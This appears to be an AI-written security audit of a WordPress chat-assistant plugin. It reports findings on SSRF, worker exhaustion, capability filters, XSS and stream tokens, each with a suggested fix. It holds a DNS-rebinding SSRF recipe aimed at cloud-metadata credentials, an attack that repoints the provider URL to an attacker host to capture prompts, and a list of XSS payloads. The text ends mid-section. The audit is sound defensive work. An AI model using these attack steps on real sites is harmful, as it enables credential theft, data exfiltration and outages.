# Security audit — Alpaca Bot 0.5.0-dev (P5 task 6a, Kanboard #2944)

Date: 2026-09-09. Branch `develop`. Scope: `src/Rest/*`, `src/View/*`, `src/Toolkit/*`,
`src/Shortcodes/*`, `src/Admin/*`, `resources/ts/*`, plus the code those reach
(`src/Chat/*`, `src/Settings/*`, `src/Context/*`, `src/Capability.php`, `src/Abilities/*`).

Method: the `security-review` skill was loaded and its methodology followed inline. Two
deviations, both deliberate: the skill asks the reviewer to fan the work out to sub-agents,
and this dispatch forbids dispatching sub-agents, so every phase was run in one session; and
the skill's hard exclusions (rate limiting, resource exhaustion) are items the task brief
asks for by name, so they are reported here and labelled. The skill also required
`refs/remotes/origin/HEAD` to be set before it would load; `git remote set-head origin main`
was run, which writes a local ref only and touches no tracked file.

Nothing in this audit changed source. Claims marked **probed** were executed; the commands and
their output are quoted with the finding.

## Summary

| Severity | Count |
| --- | --- |
| Critical | 0 |
| High | 1 |
| Medium | 3 |
| Low | 2 |
| Info / observation | 4 |

One High: SSRF through `web_fetch`, reachable by any Contributor, already documented in the
code as a known and accepted gap. Nothing found is a straightforward escalation from
unauthenticated or Subscriber to anything the plugin gates — the capability checks, the
conversation ownership boundary, the markdown renderer and the stream ticket all hold under
probing. The Medium findings are one real resource bound that is missing and two places where
a documented extension filter has no floor under it.

---

## Findings

### H-1 — SSRF in `web_fetch`: validate-then-fetch is a TOCTOU, and the body comes back

* **Severity:** High
* **Category:** `ssrf`
* **Where:** `src/Toolkit/WebFetchToolkit.php:116` (`wp_http_validate_url` then
  `wp_safe_remote_get`), `:182-206` (`hostIsPublic()`), `:234-251` (`resolve()`);
  reachable without a model through `src/Shortcodes/AgentShim.php:102-117`.
* **Status in the code:** known. The class docblock at `:34-48` states the gap and the reason
  it is not closed, and recommends a network egress policy. This finding does not contradict
  that; it records the exploitability so the release gate is making the decision knowingly.

**Attack.** The attacker is any user who holds `edit_posts` — a **Contributor** on a stock
site, the lowest role that can write a post. No model is needed:

1. Attacker controls `rebind.example` with a 1-second TTL, answering alternately
   `93.184.216.34` (public) and `169.254.169.254` (or `127.0.0.1`, or an internal RFC 1918
   address).
2. Attacker writes a draft post containing
   `[alpacabot_agent name="get" url="http://rebind.example/latest/meta-data/iam/security-credentials/"]`.
3. Attacker previews their own draft. `Shortcodes\Chat::answer()` (`src/Shortcodes/Chat.php:191`)
   admits them — `viewerMayGenerate()` is `is_user_logged_in() && current_user_can('edit_posts')`
   — and `AgentShim::fetch()` runs the `web_fetch` tool directly with the attacker's URL.
4. `wp_http_validate_url()` resolves the name (public answer), `hostIsPublic()` resolves it
   again (public answer), and the transport resolves it a third time when it connects
   (private answer). Three separate lookups, one attacker-controlled TTL.
5. `name="get"` returns the fetched page text, which `Chat::output()` prints into the preview
   escaped. The attacker reads the internal response.

The same primitive is reachable through the model (`web_fetch` is on by default —
`toolkits.enabled` defaults to `['web_fetch','summarize','draft_post']`,
`src/Settings/Schema.php:98`), but the shortcode path needs no model, no tool-capable model,
and no prompt engineering.

**What it gets them:** an unauthenticated GET from the web server's own network position to
anything that host can reach — an internal dashboard, an admin API on a private address, and
on a cloud instance the metadata service, which under IMDSv1 answers with the instance's
credentials. The body is returned to the attacker, so this is a full-read SSRF, not blind.

**What the plugin does get right** (probed): the address table itself is complete and the
shorthand encodings the brief names are all refused.

```
$ php scratchpad/spa.php
127.0.0.1                    isAddress=yes   -> 127.0.0.0/8
0.0.0.0                      isAddress=yes   -> 0.0.0.0/8
169.254.169.254              isAddress=yes   -> 169.254.0.0/16
100.64.0.1                   isAddress=yes   -> 100.64.0.0/10
255.255.255.255              isAddress=yes   -> 240.0.0.0/4
::1                          isAddress=yes   -> ::1/128
::ffff:127.0.0.1             isAddress=yes   -> ::ffff:0:0/96
::ffff:169.254.169.254       isAddress=yes   -> ::ffff:0:0/96
64:ff9b::7f00:1              isAddress=yes   -> 64:ff9b::/96
2002:7f00:1::                isAddress=yes   -> 2002::/16
fd00::1                      isAddress=yes   -> fc00::/7
fe80::1                      isAddress=yes   -> fe80::/10
8.8.8.8                      isAddress=yes   -> PUBLIC
0177.0.0.1                   isAddress=no    -> NOT-AN-ADDRESS
2130706433                   isAddress=no    -> NOT-AN-ADDRESS
0x7f000001                   isAddress=no    -> NOT-AN-ADDRESS
127.1                        isAddress=no    -> NOT-AN-ADDRESS
```

The four shorthand forms fall through to `resolve()`, and that refuses them too — probed
against the live resolver:

```
$ php scratchpad/dns.php
example.com          gethostbynamel=["104.20.23.154","172.66.147.243"] dns_AAAA=array(2)
github.com           gethostbynamel=["140.82.113.4"]                   dns_AAAA=array(0)
0177.0.0.1           gethostbynamel=["127.0.0.1"]                      dns_AAAA=array(0)
2130706433           gethostbynamel=["127.0.0.1"]                      dns_AAAA=FALSE
127.1                gethostbynamel=["127.0.0.1"]                      dns_AAAA=array(0)
```

`0177.0.0.1` and `127.1` resolve to `127.0.0.1`, which the table then refuses; `2130706433`
makes `dns_get_record()` return `false`, which `resolve()` reads as "lookup failed" and
answers `[]`, which `hostIsPublic()` refuses. The `github.com` row also settles the functional
worry in `resolve()`'s docblock: an A-only host answers `array(0)`, not `false`, so the
fail-closed rule does not break the ordinary web.

The redirect guard is real and correctly wired — verified against WordPress core on disk
(6.8.3, `/home/carmelo/Projects/WordPress/wp-localhost`):

* `wp-includes/Requests/src/Requests.php:794-808` absolutizes a relative `Location` and then
  dispatches `requests.before_redirect` with `&$location` first.
* `wp-includes/class-wp-http-requests-hooks.php:75` re-fires that as
  `do_action_ref_array("requests-requests.before_redirect", $parameters, …)`, after core's own
  `validate_redirects` has run — so the plugin's guard at `WebFetchToolkit.php:126` sees every
  hop, after core's check, and adds the link-local / IPv6 / AAAA coverage core lacks.
* `wp-includes/class-wp-http.php:423` catches `WpOrg\Requests\Exception`, so the guard's throw
  becomes a `WP_Error` and the tool reports it. The guard is not decorative.

So the redirect leg is closed. The rebinding leg is not, and it is the one that matters.

**Fix.** Resolve once and connect to the address that was checked: pin the resolved IP with
`CURLOPT_RESOLVE` through core's `http_api_curl` filter (and refuse the fetch outright when
the transport is not cURL, rather than silently falling back to an unpinned fsockopen). Until
that is done, the README/help tab should state, in the operator's words, that `web_fetch` is
an outbound-request primitive available to every Contributor and that an egress policy is the
supported mitigation — the argument currently lives only in a source docblock.

---

### M-1 — SSE streaming has no wall-clock bound: `set_time_limit(0)` is not bounded by the provider timeout

* **Severity:** Medium (resource exhaustion — reported because the brief asks for it by name)
* **Category:** `resource-exhaustion`
* **Where:** `src/Rest/Sse.php:182-183` (`ignore_user_abort(true); set_time_limit(0);`),
  `src/Rest/StreamController.php:50-65` (stream route is deliberately not rate limited),
  `src/Chat/Assistant.php:50` (`$maxIter = 6`), `src/Settings/Schema.php:75`
  (`provider.timeout`, default 60, max 600).

**Attack.** Attacker is one authenticated user with `edit_posts` — or one leaked Application
Password, which core scopes to nothing narrower than the whole user.

1. `POST /alpaca-bot/v1/chat {"stream":true, …}` costs one hit on the 30-per-minute `chat`
   bucket and returns a ticket. Thirty tickets a minute.
2. Each ticket is redeemed on `GET /chat/{id}/stream?token=…`, which is **not** rate limited
   (by design — the turn was counted on the POST) and which calls `Sse::prepareOutput()`.
3. That lifts PHP's time limit entirely and sets `ignore_user_abort(true)`. The turn's actual
   bound is not one provider timeout: a tool turn is up to 6 agent iterations
   (`Assistant::__construct`), each a provider `stream()` call of up to `provider.timeout`,
   plus the library's two empty-response nudges, plus any `summarize` tool call, which is a
   *nested* `Pipeline::complete()` and therefore another full provider call
   (`src/Toolkit/SummarizeToolkit.php:82`). Worst case at defaults is roughly
   `12 × 60 s = 12 minutes` of one PHP worker; at `provider.timeout = 600` it is two hours.
4. `connection_aborted()` is only consulted after a frame is written
   (`StreamController.php:190`), and between frames the process is inside a provider call, so
   closing the browser does not stop it — which is what `ignore_user_abort(true)` is for.

Thirty such requests a minute, each holding a worker for minutes, exhausts any ordinary
PHP-FPM pool (5–50 workers) and takes the whole site down, not only the plugin.

**Note on the existing comments.** `Sse.php`'s docblock says "The window that remains is one
provider call" — that sentence is about *abort detection*, and it is accurate. Nothing in the
class claims a total runtime bound, and there isn't one. This finding is the missing bound,
not a false comment.

**Fix.** Compute a deadline once in `StreamController::stream()` —
`provider.timeout × (maxIter + 2)` plus a margin — and pass it to `set_time_limit()` instead
of `0`, or check it between frames and end the turn with an `error` frame. A concurrency cap
per user on ticket redemption (a short-lived transient counting live streams) would be the
stronger fix and is cheap, since a ticket is already a transient.

**What shipped, and one correction to the sentence above** (added 2026-09-09, after the audit;
`src/Rest/StreamBudget.php` carries the whole argument). Both bounds were built: a wall-clock
budget per turn, and a per-person cap on live streams. But **a transient counting live streams
is not a cap** — the first version of this was exactly that, and it does not work. A transient
is read-modify-write, so redemptions arriving together all read the same count and the store
ends one higher however many of them ran. Probed against that version, three batches of ten
redemptions from one account against a cap of three gave `live=30 recorded=3`. What replaced it
is a claim the database decides: one option row per slot and `INSERT IGNORE` on the unique key
over `option_name`, the same primitive core locks with in `WP_Upgrader::create_lock()`. The
same probe against the shipped class gives `live=3 recorded=3`. The wall-clock half of the fix
is as recommended here.

---

### M-2 — `GET /settings?reveal=1` returns the provider API key with no floor under the capability filter

* **Severity:** Medium — **filter-dependent, not exploitable on a default install**
* **Category:** `authorization`
* **Where:** `src/Rest/SettingsController.php:68-82`, `src/Rest/Controller.php:63-81`.

On a stock site the route's capability is `manage_options` and this is correct. But the
capability is filtered — `alpaca_bot/capability/settings` (probed; see the enumeration in the
capability-filters section below) — and the docblock advertises the filter as a way to
"tighten … or loosen" a route. `show()` then checks nothing beyond the route's own gate:

```php
if ((bool) $request->get_param('reveal')) {
    $response = new \WP_REST_Response($this->store->all());   // raw provider.api_key
```

**Attack.** A site adds a "site manager" role and loosens
`alpaca_bot/capability/settings` to a capability that role holds (a plausible thing to do — the
filter exists for it, and the settings page has plenty a non-admin might legitimately manage).
That role can now `GET /alpaca-bot/v1/settings?reveal=1` and read the provider API key in
cleartext, and `PUT /alpaca-bot/v1/settings {"provider.base_url": "https://attacker/v1"}` to
repoint every future turn — exfiltrating every prompt and every reply on the site — because
the same filter key covers both verbs (`Controller::routeKey('/settings') === 'settings'`).

**Fix.** Make `reveal=1` ask `manage_options` unconditionally, independent of the route filter,
and say in the filter's docblock that loosening `alpaca_bot/capability/settings` hands out the
provider credential and the provider endpoint. Consider splitting the write verb onto its own
filter key so "let this role read the settings" is expressible without "let this role change
where the site sends its prompts".

---

### M-3 — A capability filter can downgrade `chat` to `read` or `exist`, which hands out `web_fetch`

* **Severity:** Medium — **filter-dependent, by design, but the consequence is undocumented**
* **Category:** `authorization`
* **Where:** `src/Capability.php:33-39`, `src/Rest/Controller.php:63-81`.

This is the item the brief asks to be documented by name. The full answer is in the
"Capability filters" section below; the finding here is the part worth acting on.

`Capability::filtered()` blocks the *accidental* downgrade — a filter returning `true`, `1`,
`'1'`, `0`, `''`, `null` or an array is ignored — but it honours any non-empty non-numeric
string, and `read` (every Subscriber) and `exist` (every visitor, logged out included —
`wp-includes/class-wp-user.php:817-818`, "Everyone is allowed to exist") are both such
strings. That is deliberate and the docblock says so.

What is *not* said anywhere is what `alpaca_bot/capability/chat` set to `read` actually opens.
It is not only "a Subscriber can chat and spend tokens". `Pipeline::send()` resolves toolkits
per user through `Registry::enabled($userId)`, which consults only the `toolkits.enabled`
setting and the `alpaca_bot/toolkits` filter — **no capability check of its own**. So a
Subscriber admitted to `/chat` gets `web_fetch` (finding H-1's SSRF primitive) and `summarize`.
Only `draft_post` re-checks a capability (`src/Toolkit/DraftPostToolkit.php:185`,
`user_can($userId, 'edit_posts'|'edit_pages')`) and refuses them. Set to `exist`, the same is
true for the anonymous internet, rate limited to 30/minute per client address.

**Fix.** Documentation, and one guard. Say in the `alpaca_bot/capability/{route}` docblock and
in `docs/hooks.md` that opening `chat` also opens every enabled toolkit to that role, and name
`web_fetch` specifically. Then consider giving `Registry::enabled()` a capability floor of its
own — `web_fetch` in particular has no business running for a role the operator only meant to
let converse.

---

### L-1 — The site's own host is exempt from every address check

* **Severity:** Low
* **Category:** `ssrf`
* **Where:** `src/Toolkit/WebFetchToolkit.php:188-190`.

```php
if ($host === strtolower((string) wp_parse_url(home_url(), PHP_URL_HOST))) {
    return true;
}
```

The exemption is core's (`wp_http_validate_url()` makes the same one) and the docblock says so
and says what it costs. Recorded because it is a *non-rebinding* server-side request a
Contributor controls: `[alpacabot_agent name="get" url="http://<site-host>:8080/"]` makes the
web server issue a GET to its own hostname on 80, 443 or 8080 (`http_allowed_safe_ports`) and
returns the body. On the very common deployment where that hostname resolves to a local
address on the server itself, the request never traverses the reverse proxy, so any IP
allowlist, WAF rule or basic-auth gate installed *in front of* WordPress is bypassed for those
three ports.

**Fix.** None required for parity with core. If it is tightened, tighten it to "the site's own
host, and only paths under `home_url()`'s own path", and say so.

---

### L-2 — False comment: the 0.4 migration does not run "per admin request"

* **Severity:** Low
* **Category:** `comment-contradicts-code`
* **Where:** `src/Settings/Migrate04.php:17-19` and `:143-146`, against
  `src/Plugin.php:139-144`.

The class docblock says the conversation pass "handles BATCH rows per admin request", and
`optionsPending()` says its detection happens "once instead of on every admin request". The
wiring is:

```php
add_action('init', function () use ($store): void {
    $migration = new Migrate04($store);
    if ($migration->needed()) { $migration->run(); }
}, 20);
```

`init` fires on every request — front end, REST, cron, anonymous — not only in wp-admin. Its
own comment two lines above even explains *why* it is on `init` and not `admin_init` (WP-CLI),
so the code is intentional and the class docblock was simply never updated to match.

Reported under this branch's own rule that a comment carrying an argument is a claim to
verify. The consequence is real if small: an unauthenticated visitor's first page view on a
freshly upgraded 0.4 site runs up to 100 `wp_update_post()` calls and their whole hook chains
inside that request, and concurrent visitors each run the same batch because nothing locks —
the work is idempotent, so this is wasted effort rather than corruption, but the batching
rationale ("spread over several requests instead of timing out one") was written about
admin requests and does not describe what happens on a busy front page.

**Fix.** Correct both comments to say "per request". If the intent really was to keep the
migration off anonymous front-end requests, add the gate (`is_admin() || wp_doing_cron() ||
defined('WP_CLI')`) rather than the sentence.

---

### I-1 — Stream tokens travel in the query string

* **Severity:** Info
* **Where:** `src/Rest/ChatController.php:124`
  (`add_query_arg('token', $token, rest_url(…))`).

The stream ticket is a bearer credential in a URL, so it reaches web-server access logs, any
reverse proxy's logs, and anything in between. Mitigated well: 120-second TTL, single use
(`delete_transient()`'s return is the claim — the race analysis in `StreamController.php:84-101`
is correct; `delete_option()` reports the affected-row count of a `DELETE … WHERE option_name`
against a unique key, so exactly one of N concurrent redemptions wins), bound to the user id
core authenticated, and bound to the conversation in the path. The token is
`wp_generate_password(32, false)` — 32 characters over 62, ≈190 bits, from `wp_rand()`'s
CSPRNG. No action needed; recorded so the log exposure is a known property rather than a
surprise.

### I-2 — `alpaca_bot/render/allowed_tags` cannot create XSS on its own; two small notes on the default list

* **Severity:** Info
* **Where:** `src/View/Markdown.php:30, 43, 52-66`.

Probed. The environment is `['html_input' => 'strip', 'allow_unsafe_links' => false,
'max_nesting_level' => 50]` and the output goes through `wp_kses()` against the plugin's own
allowlist. Every hostile case tried came out inert:

```
IN : <script>alert(1)</script>                       OUT: (empty)
IN : <img src=x onerror=alert(1)>                    OUT: (empty)
IN : <div onmouseover="alert(1)">hi</div>            OUT: (empty)
IN : <iframe src="//evil"></iframe>                  OUT: (empty)
IN : <!-- --><svg onload=alert(1)>                   OUT: (empty)
IN : [click](javascript:alert(1))                    OUT: <p><a>click</a></p>
IN : [click](JaVaScRiPt:alert(1))                    OUT: <p><a>click</a></p>
IN : [x](vbscript:msgbox(1))                         OUT: <p><a>x</a></p>
IN : [click](data:text/html;base64,…)                OUT: <p><a>click</a></p>
IN : ![x](data:image/svg+xml;base64,…)               OUT: <p><img src="" alt="x" /></p>
IN : [a](%6a%61vascript:alert(1))                    OUT: <p><a href="alert(1)">a</a></p>
IN : ```html\n<script>alert(1)</script>\n```         OUT: <pre><code class="language-html">&lt;script&gt;…
```

The last row is the one worth naming: CommonMark passes the percent-encoded destination
through, and `wp_kses_bad_protocol()` decodes it, recognises `javascript:` and strips the
scheme, leaving a harmless relative href. Defence in depth working as the docblock claims.

On the filter itself: **widening the allowlist does not by itself produce XSS**, because raw
HTML never survives CommonMark's `html_input => 'strip'`, so adding `script` or an `on*`
attribute to the list gives the model nothing to emit into. The only injected converter seam
is `Markdown::__construct`'s optional argument, and nothing but the tests passes one. Two
minor notes on the default list at `:55`:

* `'a' => [… 'target' => true]` — CommonMark never emits `target`, so it is dead weight today,
  and if a site's filter or extension ever does emit it there is no forced
  `rel="noopener noreferrer"` beside it.
* `'img' => ['src' => true, 'alt' => true]` — model-influenced text can pull a remote image
  into a wp-admin page, which is a read receipt and an IP/UA leak to whoever wrote the prompt
  the model read. Low value to an attacker; noted for completeness.

### I-3 — `readme.txt` advertises PHP 8.1; the plugin needs 8.4

* **Severity:** Info — **not a security finding, but it is a release blocker**
* **Where:** `readme.txt:8` (`Requires PHP: 8.1`) against `alpaca-bot.php:13`
  (`Requires PHP: 8.4`) and `composer.json:13` (`"php": "^8.4"`).

`src/Context/CurrentScreenSource.php:27` uses a typed class constant (`private const int
MAX_CHARS`), which is a parse error before PHP 8.3, so 8.1 is not merely unsupported — the
plugin cannot be loaded. The plugin-file header will block activation, so a site on 8.1 is not
left running a half-parsed plugin; but the .org directory and the update API read
`readme.txt`, so the listing would tell 8.1 users the plugin is compatible.

### I-4 — Observation: `heartbeat_received` mints a fresh REST nonce inside core's nonce grace window

* **Severity:** Observation (no attacker, no sequence)
* **Where:** `src/Admin/Assets.php:133-139`.

`Assets::heartbeat()` answers `alpaca_bot_nonce` with `wp_create_nonce('wp_rest')`. Core runs
the `heartbeat_received` filter for a heartbeat nonce in state 2 (expired within the 12–24 h
grace window) as well as state 1, and only bails outright when verification fails completely.
That is fine — the caller is authenticated by cookie either way, `wp_ajax_heartbeat` is the
logged-in handler only, and the minted nonce is the same one any admin page load would give
the same user. Recorded so the next reader does not have to re-derive it.

---

## Brief items, one by one

### Nonce and cookie handling — REST vs admin-ajax vs the SSE endpoint

Examined `src/Rest/Controller.php:9-24`, `src/Admin/Assets.php:98-139`,
`resources/ts/chat.ts:56-60, 132`, `resources/ts/nonce.ts`, `src/View/Hx.php:105-108`.

The plugin writes **no nonce code of its own**; every REST route relies on core's
authentication, and the only identity a callback sees is `get_current_user_id()`. That is the
right call and the docblock states it.

**Does the nonce bind the action and the user it claims to?** It binds the *user* (the uid,
the session token and the tick go into `wp_create_nonce`'s hash) but **not the route**: the
action is the literal string `wp_rest` for every route in WordPress. So any `wp_rest` nonce a
user holds is valid for every REST route on the site, this plugin's included. That is core's
model and nothing here weakens it; it is stated because "does the nonce bind the action" has a
real answer and the answer is no. The practical consequence is nil, because the nonce is a
CSRF token, not an authorisation token — the capability check is what authorises, and it runs
per route.

* **REST:** cookie + `X-WP-Nonce`, or Application Passwords. A cookie-authenticated request
  with *no* nonce is demoted to user 0 by `rest_cookie_check_errors()`, so a plain browser
  navigation to any of these routes answers 401, never HTML. Verified against core:
  `wp-includes/rest-api.php`, the `null === $nonce` branch calls `wp_set_current_user(0)`.
  This is what keeps `GET /view/messages/{id}` — which answers `text/html` with content
  derived from stored transcripts — from being a reflected-XSS surface.
* **admin-ajax:** the plugin's only admin-ajax surface is `heartbeat_received`
  (`Assets::heartbeat`). Core verifies the `heartbeat-nonce` and runs the logged-in handler
  only. See I-4.
* **SSE:** `GET /chat/{id}/stream` is an ordinary REST route and carries the same
  cookie+nonce (`chat.ts:132` sends `X-WP-Nonce` and `credentials: 'same-origin'`), *plus* the
  single-use ticket. The ticket exists because `EventSource` cannot send headers; the plugin
  does not use `EventSource`, it reads the body with `fetch` (`resources/ts/stream.ts`), so the
  nonce is present as well as the token. Two independent checks, not one.

### Capability filters — can a filter downgrade a gate to `read`? (asked by name)

**Yes, and deliberately.** `Capability::filtered()` (`src/Capability.php:33-39`) honours any
non-empty, non-numeric string. `read` is such a string; so is `exist`. Probed:

```
== Capability::filtered('alpaca_bot/capability/chat', 'edit_posts') ==
  filter returns string "read"           -> capability checked: 'read'
  filter returns string "exist"          -> capability checked: 'exist'
  filter returns string "manage_options" -> capability checked: 'manage_options'
  filter returns bool true               -> capability checked: 'edit_posts'
  filter returns bool false              -> capability checked: 'edit_posts'
  filter returns int 1                   -> capability checked: 'edit_posts'
  filter returns string "1"              -> capability checked: 'edit_posts'
  filter returns int 0                   -> capability checked: 'edit_posts'
  filter returns string "0"              -> capability checked: 'edit_posts'
  filter returns empty string            -> capability checked: 'edit_posts'
  filter returns null                    -> capability checked: 'edit_posts'
  filter returns array                   -> capability checked: 'edit_posts'
```

So the guard does exactly what its docblock claims: it blocks the *accidental* downgrade
(`__return_true` and friends, which `WP_User::has_cap()` would read as a legacy user level)
and permits the deliberate one. `exist` is worth spelling out because it is the strongest
downgrade available: `wp-includes/class-wp-user.php:817-818` sets `$capabilities['exist'] =
true` unconditionally — "Everyone is allowed to exist" — so `current_user_can('exist')` is true
for a logged-out request. The base `Controller` docblock's claim about `exist` is therefore
**true**.

The complete filter inventory, with route keys probed through `Controller::routeKey()`:

| Filter | Default | Worst honest misconfiguration (`read`, or `exist`) |
| --- | --- | --- |
| `alpaca_bot/capability/chat` | `edit_posts` | **The worst one.** Subscribers (or anyone) can run turns: provider spend, monthly caps default to 0/unlimited, and every enabled toolkit — including `web_fetch`, i.e. finding H-1's SSRF — because `Registry::enabled()` has no capability check of its own. `draft_post` still refuses (it re-checks `edit_posts`/`edit_pages`). Rate limited to 30/min per user, or per hashed client address at `exist`. See M-3. |
| `alpaca_bot/capability/chat/stream` | `edit_posts` | Little on its own: the ticket must exist, be the caller's own, and name the conversation in the path. Opening this without `chat` opens nothing. |
| `alpaca_bot/capability/conversations` | `edit_posts` | Covers GET and DELETE on both `/conversations` and `/conversations/{id}` (one key for the collection and the item). Contained: `ConversationStore::owned()` refuses `userId < 1` and any author mismatch, so a downgraded role only ever sees and deletes its own. Low. |
| `alpaca_bot/capability/models` | `edit_posts` | Lists the provider's models and, with `refresh=1`, forces a synchronous upstream call. Rate limited. Information disclosure (which models the site runs) plus a worker-holding lever while the provider is down. |
| `alpaca_bot/capability/usage` | `edit_posts` | Own figures only. `user=all` is gated on a hard-coded `current_user_can('manage_options')` inside the callback (`UsageController.php:43-46`) that the filter cannot reach. Correct. |
| `alpaca_bot/capability/settings` | `manage_options` | **Second worst.** Covers GET *and* PUT. Reads the provider API key in cleartext via `?reveal=1`, and writes `provider.base_url` to repoint every turn. See M-2. |
| `alpaca_bot/capability/settings/schema` | `manage_options` | Field metadata only, no values. Deliberately a separate key from `settings`. Low. |
| `alpaca_bot/capability/view/messages` | `edit_posts` | Renders one of the *caller's own* transcripts as HTML; anyone else's is a 404 through `owned()`. At `exist` the caller is user 0 and `owned()` refuses, so it answers 404 — safe. |
| `alpaca_bot/capability/view/history` | `edit_posts` | Own history list. Same containment. |
| `alpaca_bot/capability/view/models` | `edit_posts` | As `/models`. Rate limited. |
| `alpaca_bot/capability/view/default-model` | `edit_posts` | Writes one usermeta row for the caller, capped at 200 chars, and refused outright while `chat.user_can_change_model` is off. Low. |
| `alpaca_bot/capability/view/bubble` | `edit_posts` | Renders caller-supplied markdown to `text/html` on the site origin. POST-only for the content-carrying variant, so it is not navigable and not a reflected-XSS surface; the GET variant takes only `role` and `streaming`. Low. |
| `alpaca_bot/admin/menu_capability` | `edit_posts` | Shows the menu and renders the chat screen. Filtered separately from the REST routes on purpose, so a role granted the menu still gets 403 from every route unless `alpaca_bot/capability/chat` is opened too. Settings stays hard-coded `manage_options` (`Menu.php:51`) because `options.php` demands it regardless — correct. |

Two capability gates in the reviewed surface are **deliberately not filterable**, and both
choices are right: `Shortcodes\Chat::CAPABILITY` (a const, `Chat.php:103` — "this is the
surface where that costs money") and the abilities' capabilities
(`Abilities\Register`, which points at core's own `wp_ability_permission_result` instead of
adding a second seam).

### Rate-limit bypass — including whether the key is attacker-controlled

Examined `src/Rest/RateLimit.php` and every caller.

**The key is not attacker-controlled.** The subject is either the server-side
`get_current_user_id()` or `wp_hash(REMOTE_ADDR)`; `client()` reads `$_SERVER['REMOTE_ADDR']`
through `FILTER_VALIDATE_IP` and **no forwarding header is honoured** — confirmed by grepping
every superglobal read in `src/`, which returns exactly five hits, none of them a forwarded
header. The docblock's reasoning ("honouring it would let one client pick its bucket") is
correct and the code matches it. Hashing the address is the right call for the reason given
(the IPv4 space is brute-forceable against a bare digest).

Bypasses that do exist and are accepted:

* **Fixed window.** Up to 2N across a minute boundary. Stated in the docblock as a known
  trade; correct for a limiter whose job is runaway clients.
* **The stream route is not limited.** Deliberate — the turn was counted on the POST that
  issued the ticket, and double-counting a streamed turn would be wrong. But it is what makes
  M-1 sharp: 30 tickets a minute can be redeemed into 30 concurrent long-lived workers.
* **No concurrency dimension.** The bucket counts requests per minute, not requests in flight.
  See M-1.
* **The floor of 1.** `max(1, …)` means a filter returning `false`/`null` cannot close a route.
  Deliberate and documented; the right choice.

Every spending surface does hit the same bucket: REST chat (`Controller::rateLimited`),
`/models` and `/view/models`, the shortcodes (`Shortcodes\Chat::answer:221`) and the chat and
summarize abilities (`Abilities\Register::limit()`). No spending path was found that skips it.

### SSRF in `web_fetch`

See H-1 for the finding and L-1 for the same-host exemption. `wp_http_validate_url` +
redirects, DNS rebinding, IPv6 and IPv4-mapped forms, decimal/octal encodings, `0.0.0.0` and
`169.254.169.254` were each probed; the results and the core-source verification of the
redirect hook are quoted there. The response body **does** come back to the model, and on the
`[alpacabot_agent name="get"]` path it comes back to the attacker directly with no model in
between.

### Stored XSS through markdown, and the `allowed_tags` filter

See I-2 for the probe results. No stored XSS found. The renderer is the strongest part of this
codebase's security posture: strip raw HTML at the parser, refuse unsafe link schemes at the
parser, then `wp_kses` a small allowlist over the result, with `wp_allowed_protocols()` doing
percent-decoding protocol checks underneath. Every other place model text or user text reaches
markup was checked and escapes correctly: `View\Component::tag()` escapes every attribute
value (and its docblock's warning that attribute *names* are written raw is honoured — every
caller passes literals), `MessageBubble` escapes a user turn with `nl2br(esc_html())` and the
model name with `esc_html`, `Receipt`/`Notice`/`HistorySelect`/`ModelSelect` escape every text
node, `Hx::attrs()` is a closed allowlist with a regex on the one open `on:` form, and
`Admin\Fields` escapes every attribute and text node including the per-model overrides table.

Client side: `resources/ts/` has three `innerHTML` writes and all three are safe —
`dom.ts:33` parses a `/view/*` fragment the server built, `highlight.ts:74` writes a literal,
and `highlight.ts:68` writes `highlight()`'s output, which escapes every span of source
(`escapeHtml` on the gap, `escapeHtml` on the match, a fixed class name in between). Streamed
deltas go in through `Node.append(string)`, which makes a text node, not HTML.

### Stream token lifetime and reuse

Examined `src/Rest/ChatController.php:112-126` and `src/Rest/StreamController.php:103-123`.

**Replay: no.** The redemption is `get_transient` → three equality checks → `delete_transient`,
and the delete's return value is the claim, so of N concurrent requests holding one token
exactly one runs a turn. The analysis in the docblock is correct for both storage backends
(options-table `DELETE` affected-row count against the unique key on `option_name`; cache
`DEL`/`delete` returning false for a key already gone). **Cross-user: no** — the ticket carries
`user_id` and is compared against `$this->userId()`, which is what core authenticated, never
anything in the request; and it carries `conversation_id`, compared against the path. **Lifetime:**
120 s (`STREAM_TTL`). **Entropy:** `wp_generate_password(32, false)` over `wp_rand()`'s CSPRNG,
≈190 bits, and the token is refused unless it matches `/^[A-Za-z0-9]+$/` *before* it becomes a
transient key, so no other string can be made to name a ticket. Every refusal is the same 403,
so the route cannot be used as an oracle. See I-1 for the query-string exposure.

One structural note, checked and clean: `handle()` stashes the redeemed ticket on the
controller instance and `serve()` matches on the **request object identity**, so a response
core rebuilt (`?_envelope=1`) still streams and no other request can pick up a stashed ticket.
A `/batch/v1` dispatch cannot reach this route at all (it never declares `allow_batch`), and
if it somehow did, `serve()` would be handed the batch request, fail the identity check, and
stream nothing. `handle()` also refuses `HEAD` with 405 + `Allow: GET` before the ticket is
read, so core's HEAD-to-GET routing cannot spend a billed turn on a probe.

### Application Password scope

Examined. There is nothing plugin-side to scope: WordPress core's Application Passwords
authenticate as the whole user with the whole capability set, and offer no per-route or
per-scope narrowing. Every route here is therefore reachable with an Application Password by
anyone who could reach it with a cookie, which is the intended design (the base `Controller`
docblock says so). Two consequences worth recording rather than fixing:

* Core restricts Application Passwords to API requests (`application_password_is_api_request`)
  and to HTTPS or a local environment, so the exposure is bounded by core's own rules.
* A leaked Application Password is a leaked `edit_posts`, which is the precondition for both
  H-1 (SSRF) and M-1 (worker exhaustion). This is called out in `ModelsController`'s docblock
  already, correctly.

No plugin code reads, mints or stores an Application Password.

### Settings mass-assignment

Examined `src/Rest/SettingsController.php:84-92` and `src/Settings/Schema.php:135-146`.

**Not exploitable.** `update()` starts with
`array_intersect_key($request->get_params(), Schema::fields())`, and `Schema::sanitize()` then
iterates `fields()` rather than the input, so the stored array is always exactly the schema's
key set — an unknown key cannot be introduced by either path. Every value is coerced by type
with min/max clamping, `select` is checked against its own options, `checkbox-list` is
intersected with its own option ids and fails closed on a malformed write, and
`models.overrides` is rebuilt per model against the field it overrides.

There is **no capability-valued setting and no endpoint the schema exposes below
`manage_options`** — the two keys that would matter, `provider.base_url` and
`provider.api_key`, are only writable through routes gated at `manage_options` by default. The
residual risk is M-2, which is about the gate being filterable, not about mass assignment.

Slashing: `update_option()` does not unslash, and the REST path carries dotted keys that only
a JSON body can express (PHP rewrites a dot in a form field name), so values arrive unslashed
and no `wp_slash()` is wanted — correct. The admin form path posts through `options.php`, which
`wp_unslash()`es before the sanitize callback runs — also correct. Every other write in `src/`
was audited: `wp_insert_post`, `wp_update_post`, `update_post_meta` and `update_user_meta` are
each wrapped in `wp_slash()` at the write and nowhere else (`ConversationStore.php:104, 163,
